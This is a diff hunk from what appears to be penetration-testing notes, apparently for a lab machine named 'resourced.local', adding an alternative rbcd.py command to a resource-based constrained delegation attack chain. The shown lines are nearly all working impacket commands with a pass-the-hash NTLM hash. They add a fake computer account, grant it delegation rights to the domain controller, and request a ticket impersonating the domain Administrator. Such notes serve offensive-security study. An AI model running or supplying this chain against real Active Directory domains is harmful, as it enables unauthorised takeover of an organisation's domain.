@@ -3838,6 +3838,8 @@ impacket-addcomputer -dc-ip 192.168.109.175 -hashes :19a3a7550ce8c505c2d46b5e39d
 
 # Configure RBCD authorization to the Domain Controller (forcing Domain Controller to allow the fake computer ATTACKVM$ to act as trustee)
 impacket-rbcd -dc-ip 192.168.109.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 'resourced.local/L.Livingstone' -delegate-from 'ATTACKVM$' -delegate-to 'RESOURCEDC$' -action 'write'
+or
+python3 rbcd.py -dc-ip 192.168.109.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
 
 # Self-sign the Domain Admin impersonation service ticket with the CIFS service (SMB) (ATTACKVM$ machine to request the DC to issue a Service Ticket - ST on behalf of the Administrator)
 impacket-getST -dc-ip 192.168.109.175 -spn 'cifs/RESOURCEDC.resourced.local' -impersonate 'Administrator' 'resourced.local/ATTACKVM$:MaliciousPass123!'
